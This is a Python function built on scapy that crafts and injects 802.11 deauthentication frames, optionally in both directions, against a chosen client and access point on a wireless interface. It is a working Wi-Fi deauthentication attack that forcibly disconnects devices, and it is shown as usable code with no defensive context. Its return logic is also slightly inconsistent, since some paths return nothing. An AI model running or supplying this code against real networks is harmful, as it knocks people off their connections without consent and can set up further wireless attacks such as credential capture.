from scapy.all import RadioTap, hexdump, Dot11, sendp, Dot11Deauth

def send_deauth(param, printed: bool=True, two_way: bool=True)->bool:
    hw_src = str(param.hw_src)
    hw_dst = str(param.hw_dst)
    bssid = str(param.bssid).replace('-', ':')
    iface = str(param.iface)
    
    dot11 = Dot11(addr1=hw_dst, addr2=hw_src, addr3=bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    # Sends the packet
    try:
        if not two_way:
            sendp(packet, iface=iface, verbose=False)
            if printed:
                param.logger.info(f"Sent deauth frame: {hw_src} -> {hw_dst}. BSSID: {bssid}")
                hexdump(packet)
                return True
        else:
            sendp(packet, iface=iface, verbose=False)
            
            dot11 = Dot11(addr1=hw_src, addr2=hw_dst, addr3=bssid)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)       
            sendp(packet, iface=iface, verbose=False)
            
            if printed:
                param.logger.info(f"Sent deauth frames: {hw_src} <-> {hw_dst}. BSSID: {bssid}")
    
    except Exception as e:
        param.logger.error(f"Packet(s) was not sent: {e}")
        return False